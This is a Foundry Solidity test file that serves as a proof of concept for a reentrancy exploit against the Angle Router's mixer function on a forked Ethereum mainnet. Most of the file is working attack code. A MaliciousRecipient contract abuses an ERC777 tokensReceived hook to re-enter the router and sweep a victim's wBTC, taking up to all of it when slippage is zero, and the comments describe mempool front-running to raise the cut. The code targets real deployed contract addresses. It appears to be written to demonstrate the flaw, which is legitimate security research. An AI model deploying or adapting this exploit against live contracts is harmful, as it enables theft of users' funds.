// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";
import "./StorageSlot.sol";

import "../src/AngleRouterMainnet/@openzeppelin/contracts/interfaces/IERC20.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

import "../src/AngleRouterMainnet/contracts/BaseRouter.sol";
import "../src/AngleRouterMainnet/contracts/implementations/mainnet/AngleRouterMainnet.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISanToken.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IPerpetualManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IVeANGLE.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISavingsRateIlliquid.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IStableMasterFront.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/external/uniswap/IUniswapRouter.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/external/IWETH9.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IVaultManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISwapper.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ICoreBorrow.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IPoolManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IFeeDistributorFront.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ILiquidityGauge.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ITreasury.sol";

// foundry cheatsheet: https://github.com/foundry-rs/foundry/blob/master/forge/README.md#cheat-codes
interface IAngleRouter {
    function mixer(
        PermitType[] memory paramsPermit,
        ActionType[] calldata actions,
        bytes[] calldata data
    ) external;
}

contract Common {
  IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
  address VAULT_MANAGER_ADDRESS = 0x241D7598BD1eb819c0E9dEd456AcB24acA623679;
  address VAULT_COLLATERAL = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; //wBTC
  address VAULT_STABLECOIN = 0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8; //agEUR
  address VAULT_COLLATERAL_HOLDER = 0x218B95BE3ed99141b0144Dba6cE88807c4AD7C09; //just a random account we'll prank to get wBTC from
  AngleRouterMainnet angleRouter = AngleRouterMainnet(payable(0x4579709627CA36BCe92f51ac975746f431890930));
  IVaultManagerFunctions vaultManager = IVaultManagerFunctions(VAULT_MANAGER_ADDRESS);
  IVaultManagerStorage vaultManagerStorage = IVaultManagerStorage(VAULT_MANAGER_ADDRESS);
}

interface ERC1820ImplementerInterface {
    /// @notice Indicates whether the contract implements the interface 'interfaceHash' for the address 'addr' or not.
    /// @param interfaceHash keccak256 hash of the name of the interface
    /// @param addr Address for which the contract will implement the interface
    /// @return ERC1820_ACCEPT_MAGIC only if the contract implements 'interfaceHash' for the address 'addr'.
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);
}

contract MockERC777 is ERC777 {
  constructor(address[] memory admins) ERC777 ("Test777", "TST", admins) {
    _mint(admins[0], 1000000000e18, "", "");
  }
}

// this is a malicious recipient, that will steal
contract MaliciousRecipient is IERC777Recipient, ERC1820ImplementerInterface, Common {
    bytes32 constant internal ERC1820_ACCEPT_MAGIC = keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    address erc777;
    address recipient;
    uint256 percentageToSteal;

    constructor (address _erc777, address _recipient) {
      // _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
      erc777 = _erc777;
      recipient = _recipient;
      percentageToSteal = 1;
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32) {
      return ERC1820_ACCEPT_MAGIC;
    }

    // this function may be used in frontrunning an address to check what the minimumAmountOut is set to and react accordingly
    // please keep in mind that this is a simple implementation, and some more complex could work on multiple tokens, based
    // on the mempool watchers
    function setPercentageToSteal(uint256 newPercentage) external {
        percentageToSteal = newPercentage;
    }

    // this is the heart of the attack - if reenters the AngleRouter::mixer, and gets proper percentage.
    // If minAmountOut is set to 99%, it will get 1%, if it's set to 0, setting setPercentageToSteal from this contract would
    // be able to steal all the funds
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
      PermitType[] memory permit = new PermitType[](0);
      ActionType[] memory actions = new ActionType[](1);
      bytes[] memory datas = new bytes[](1);

      IERC20(VAULT_COLLATERAL).approve(address(angleRouter), type(uint256).max);
      uint256 routerBalance = IERC20(VAULT_COLLATERAL).balanceOf(address(angleRouter));
      uint256 amountToSteal = (routerBalance * percentageToSteal) / 100; // 1%

      actions[0] = ActionType.sweep;
      datas[0] = abi.encode(VAULT_COLLATERAL, 0, address(this));

      angleRouter.mixer(permit, actions, datas);

      IERC20(VAULT_COLLATERAL).transfer(address(angleRouter), routerBalance - amountToSteal);
      IERC20(VAULT_COLLATERAL).transfer(recipient, amountToSteal);
    }
}

contract AngleRouterMainnetPOC is Test, Common {
  address ALICE_ADDRESS = address(vm.addr(101));
  address BOB_ADDRESS = address(vm.addr(201));

  function testReenter() public {
    vm.createSelectFork('https://rpc.ankr.com/eth');

    vm.label(address(angleRouter), "AngleRouter");
    vm.label(VAULT_MANAGER_ADDRESS, "VaultManager");
    vm.label(ALICE_ADDRESS, "Alice");
    vm.label(BOB_ADDRESS, "Bob");
    vm.label(VAULT_COLLATERAL, "wBTC");
    vm.label(VAULT_STABLECOIN, "agEUR");

    vm.deal(ALICE_ADDRESS, 1 ether);
    vm.deal(BOB_ADDRESS, 1 ether);


    //setup ERC777, for ease of proof I created one
    address [] memory admins = new address [](1);

    admins [0] = BOB_ADDRESS;

    MockERC777 erc777 = new MockERC777(admins);
    //setup malicious recipient, that will renenter the router
    MaliciousRecipient maliciousERC777Recipient = new MaliciousRecipient(address(erc777), BOB_ADDRESS);
    vm.label(address(erc777), "ERC777");
    vm.label(address(maliciousERC777Recipient), "ERC777Recipient");
    vm.prank(BOB_ADDRESS);
    _ERC1820_REGISTRY.setInterfaceImplementer(BOB_ADDRESS, keccak256("ERC777TokensRecipient"), address(maliciousERC777Recipient));

    vm.prank(BOB_ADDRESS);
    erc777.transfer(ALICE_ADDRESS, 1e18); // just a mock, to add ERC777 for Alice, so that she can use it in the router

    // now we'll just get collateral from a random holder on mainnet - we'll need that in our test
    vm.startPrank(VAULT_COLLATERAL_HOLDER);

    IERC20(VAULT_COLLATERAL).transfer(ALICE_ADDRESS, 1e8);

    vm.stopPrank();

    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(ALICE_ADDRESS), 1e8);
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(BOB_ADDRESS), 0); // Bob doesn't have any wBTC


    vm.startPrank(ALICE_ADDRESS);
    // approve the amounts so that the router can use the tokens
    IERC20(VAULT_COLLATERAL).approve(address(angleRouter), 1e8);
    erc777.approve(address(angleRouter), 1e18);

    PermitType[] memory aliceParamsPermitRouter = new PermitType[](0);
    ActionType[] memory aliceActionsRouter = new ActionType[](4);
    bytes[] memory aliceDataRouter = new bytes[](4);

    // first Alice wants to transfer wBTC and ERC777 to the contract to work on them
    aliceActionsRouter[0] = ActionType.transfer;
    aliceDataRouter[0] = abi.encode(VAULT_COLLATERAL, address(angleRouter), 1e8);
    aliceActionsRouter[1] = ActionType.transfer;
    aliceDataRouter[1] = abi.encode(address(erc777), address(angleRouter), 1e18);

    // imagine that she does some work, i.e. swaps tokens for others, or does any other operations supported by the Router
    // ......


    // finally she wants to transfer her tokens to Bob. She doesn't know that Bob is malicious
    aliceActionsRouter[2] = ActionType.sweep;
    aliceDataRouter[2] = abi.encode(address(erc777), 1e18, BOB_ADDRESS);
    aliceActionsRouter[3] = ActionType.sweep;
    aliceDataRouter[3] = abi.encode(VAULT_COLLATERAL, 99e6, ALICE_ADDRESS); //Alice sets slippage to 1%

    angleRouter.mixer(aliceParamsPermitRouter, aliceActionsRouter, aliceDataRouter);

    // after executing the call, Alice sure received 99% of what she put, but Bob stole the remaining 1% due to reentrancy attack
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(ALICE_ADDRESS), 99e6);
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(BOB_ADDRESS), 1e6);

    vm.stopPrank();
  }

  //this time Bob knows that Alice will set minAmountOut to 0, because he watches mempool and frontruns the attack
  function testReenter100Percent() public {
    vm.createSelectFork('https://rpc.ankr.com/eth');

    vm.label(address(angleRouter), "AngleRouter");
    vm.label(VAULT_MANAGER_ADDRESS, "VaultManager");
    vm.label(ALICE_ADDRESS, "Alice");
    vm.label(BOB_ADDRESS, "Bob");
    vm.label(VAULT_COLLATERAL, "wBTC");
    vm.label(VAULT_STABLECOIN, "agEUR");

    vm.deal(ALICE_ADDRESS, 1 ether);
    vm.deal(BOB_ADDRESS, 1 ether);


    //setup ERC777, for ease of proof I created one
    address [] memory admins = new address [](1);

    admins [0] = BOB_ADDRESS;

    MockERC777 erc777 = new MockERC777(admins);
    //setup malicious recipient, that will renenter the router
    MaliciousRecipient maliciousERC777Recipient = new MaliciousRecipient(address(erc777), BOB_ADDRESS);
    maliciousERC777Recipient.setPercentageToSteal(100);
    vm.label(address(erc777), "ERC777");
    vm.label(address(maliciousERC777Recipient), "ERC777Recipient");
    vm.prank(BOB_ADDRESS);
    _ERC1820_REGISTRY.setInterfaceImplementer(BOB_ADDRESS, keccak256("ERC777TokensRecipient"), address(maliciousERC777Recipient));

    vm.prank(BOB_ADDRESS);
    erc777.transfer(ALICE_ADDRESS, 1e18); // just a mock, to add ERC777 for Alice, so that she can use it in the router

    // now we'll just get collateral from a random holder on mainnet - we'll need that in our test
    vm.startPrank(VAULT_COLLATERAL_HOLDER);

    IERC20(VAULT_COLLATERAL).transfer(ALICE_ADDRESS, 1e8);

    vm.stopPrank();

    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(ALICE_ADDRESS), 1e8);
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(BOB_ADDRESS), 0); // Bob doesn't have any wBTC


    vm.startPrank(ALICE_ADDRESS);
    // approve the amounts so that the router can use the tokens
    IERC20(VAULT_COLLATERAL).approve(address(angleRouter), 1e8);
    erc777.approve(address(angleRouter), 1e18);

    PermitType[] memory aliceParamsPermitRouter = new PermitType[](0);
    ActionType[] memory aliceActionsRouter = new ActionType[](4);
    bytes[] memory aliceDataRouter = new bytes[](4);

    // first Alice wants to transfer wBTC and ERC777 to the contract to work on them
    aliceActionsRouter[0] = ActionType.transfer;
    aliceDataRouter[0] = abi.encode(VAULT_COLLATERAL, address(angleRouter), 1e8);
    aliceActionsRouter[1] = ActionType.transfer;
    aliceDataRouter[1] = abi.encode(address(erc777), address(angleRouter), 1e18);

    // imagine that she does some work, i.e. swaps tokens for others, or does any other operations supported by the Router
    // ......


    // finally she wants to transfer her tokens to Bob. She doesn't know that Bob is malicious
    aliceActionsRouter[2] = ActionType.sweep;
    aliceDataRouter[2] = abi.encode(address(erc777), 1e18, BOB_ADDRESS);
    aliceActionsRouter[3] = ActionType.sweep;
    aliceDataRouter[3] = abi.encode(VAULT_COLLATERAL, 0, ALICE_ADDRESS); //Alice sets no slippage => minAmountOut = 0

    angleRouter.mixer(aliceParamsPermitRouter, aliceActionsRouter, aliceDataRouter);

    // after executing the call, Alice received nothing of what she put, because minAmountOut for this sweep was 0, and Bob used it so steal everything.
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(ALICE_ADDRESS), 0);
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(BOB_ADDRESS), 1e8);

    vm.stopPrank();
  }
}
